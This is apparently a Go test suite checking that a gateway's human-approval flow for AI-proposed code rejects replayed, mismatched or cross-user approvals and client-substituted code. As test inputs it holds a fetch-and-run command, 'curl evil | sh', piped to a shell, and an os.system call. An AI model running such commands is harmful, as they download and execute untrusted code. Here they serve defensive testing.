// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package gateway_test

import (
	"encoding/json"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"

	"github.com/agent-substrate/substrate/demos/conference/cmd/conf-gateway/internal/gateway"
	"github.com/agent-substrate/substrate/demos/conference/pkg/types"
)

const actorProposedCode = "print('actor proposed this')"

// approvalHarness is a gateway in front of a fake actor that records every
// approval body the actor receives.
type approvalHarness struct {
	gw  *gateway.Gateway
	url string

	mu        sync.Mutex
	approvals []types.ApprovalResponse
}

func (h *approvalHarness) received() []types.ApprovalResponse {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]types.ApprovalResponse(nil), h.approvals...)
}

// newApprovalHarness starts a gateway in front of a fake actor that proposes
// actorProposedCode on every chat turn.
func newApprovalHarness(t *testing.T) *approvalHarness {
	t.Helper()
	h := &approvalHarness{}
	upstream := http.NewServeMux()
	upstream.HandleFunc("/api/chat", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{
			ID:      "msg-approval",
			Sender:  types.SenderAssistant,
			Content: "Needs approval",
			Approval: &types.ApprovalRequest{
				ApprovalID: "app-1",
				Summary:    "run code",
				Code:       actorProposedCode,
				Language:   "python",
				RiskLevel:  types.RiskLow,
			},
		})
	})
	upstream.HandleFunc("/api/approve", func(w http.ResponseWriter, r *http.Request) {
		var req types.ApprovalResponse
		_ = json.NewDecoder(r.Body).Decode(&req)
		h.mu.Lock()
		h.approvals = append(h.approvals, req)
		h.mu.Unlock()
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(types.ChatMessage{Execution: &types.ExecutionResult{Stdout: "ok\n", DurationMs: 1}})
	})
	upstreamSrv := httptest.NewServer(upstream)
	t.Cleanup(upstreamSrv.Close)

	h.gw = newTestGateway(t, upstreamSrv.URL, "")
	ts := httptest.NewServer(h.gw.Handler())
	t.Cleanup(ts.Close)
	h.url = ts.URL
	return h
}

func (h *approvalHarness) post(t *testing.T, path, token, body string) (int, []byte) {
	t.Helper()
	req, err := http.NewRequest(http.MethodPost, h.url+path, strings.NewReader(body))
	if err != nil {
		t.Fatalf("build request: %v", err)
	}
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Authorization", "Bearer "+token)
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		t.Fatalf("POST %s: %v", path, err)
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, b
}

// proposal sends a chat turn and returns the approval the attendee is shown.
func (h *approvalHarness) proposal(t *testing.T, token string) *types.ApprovalRequest {
	t.Helper()
	status, body := h.post(t, "/api/chat", token, `{"message":"check telemetry anomalies and run a scan"}`)
	if status != http.StatusOK {
		t.Fatalf("chat: status %d: %s", status, body)
	}
	var msg types.ChatMessage
	if err := json.Unmarshal(body, &msg); err != nil {
		t.Fatalf("decode chat response: %v", err)
	}
	if msg.Approval == nil {
		t.Fatalf("chat response carried no approval: %s", body)
	}
	return msg.Approval
}

func approveBody(t *testing.T, r types.ApprovalResponse) string {
	t.Helper()
	b, err := json.Marshal(r)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	return string(b)
}

func TestApprove_WithoutPendingApprovalIsRejected(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	status, _ := h.post(t, "/api/approve", token, approveBody(t, types.ApprovalResponse{
		ApprovalID: "app-1", Decision: types.DecisionApprove, Code: "import os; os.system('id')", Language: "python",
	}))
	if status != http.StatusConflict {
		t.Errorf("status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0: %+v", len(got), got)
	}
}

func TestApprove_MismatchedApprovalIDIsRejected(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	h.proposal(t, token)
	status, _ := h.post(t, "/api/approve", token, approveBody(t, types.ApprovalResponse{
		ApprovalID: "some-other-approval", Decision: types.DecisionApprove,
	}))
	if status != http.StatusConflict {
		t.Errorf("status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0: %+v", len(got), got)
	}
}

func TestApprove_ForwardsProposedCodeNotClientCode(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	proposed := h.proposal(t, token)
	status, body := h.post(t, "/api/approve", token, approveBody(t, types.ApprovalResponse{
		ApprovalID: proposed.ApprovalID, Decision: types.DecisionApprove,
		Code: "import os; os.system('curl evil | sh')", Language: "bash",
	}))
	if status != http.StatusOK {
		t.Fatalf("status = %d, want 200: %s", status, body)
	}
	got := h.received()
	if len(got) != 1 {
		t.Fatalf("actor received %d approvals, want 1", len(got))
	}
	if got[0].Code != proposed.Code || got[0].Language != proposed.Language {
		t.Errorf("actor received code %q (%s), want proposed %q (%s)", got[0].Code, got[0].Language, proposed.Code, proposed.Language)
	}
}

func TestApprove_CannotReplayConsumedApproval(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	proposed := h.proposal(t, token)
	body := approveBody(t, types.ApprovalResponse{ApprovalID: proposed.ApprovalID, Decision: types.DecisionApprove})
	if status, b := h.post(t, "/api/approve", token, body); status != http.StatusOK {
		t.Fatalf("first approve: status %d: %s", status, b)
	}
	if status, _ := h.post(t, "/api/approve", token, body); status != http.StatusConflict {
		t.Errorf("replayed approve: status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 1 {
		t.Errorf("actor received %d approvals, want 1", len(got))
	}
}

func TestApprove_OtherAttendeeCannotUseApproval(t *testing.T) {
	h := newApprovalHarness(t)
	proposed := h.proposal(t, h.gw.MintToken("attendee-01"))
	status, _ := h.post(t, "/api/approve", h.gw.MintToken("attendee-02"), approveBody(t, types.ApprovalResponse{
		ApprovalID: proposed.ApprovalID, Decision: types.DecisionApprove,
	}))
	if status != http.StatusConflict {
		t.Errorf("status = %d, want 409", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0", len(got))
	}
}

func TestApprove_InvalidDecisionIsBadRequest(t *testing.T) {
	h := newApprovalHarness(t)
	token := h.gw.MintToken("attendee-01")
	proposed := h.proposal(t, token)
	status, _ := h.post(t, "/api/approve", token, `{"approval_id":"`+proposed.ApprovalID+`","decision":"MAYBE"}`)
	if status != http.StatusBadRequest {
		t.Errorf("status = %d, want 400", status)
	}
	if got := h.received(); len(got) != 0 {
		t.Errorf("actor received %d approvals, want 0", len(got))
	}
}
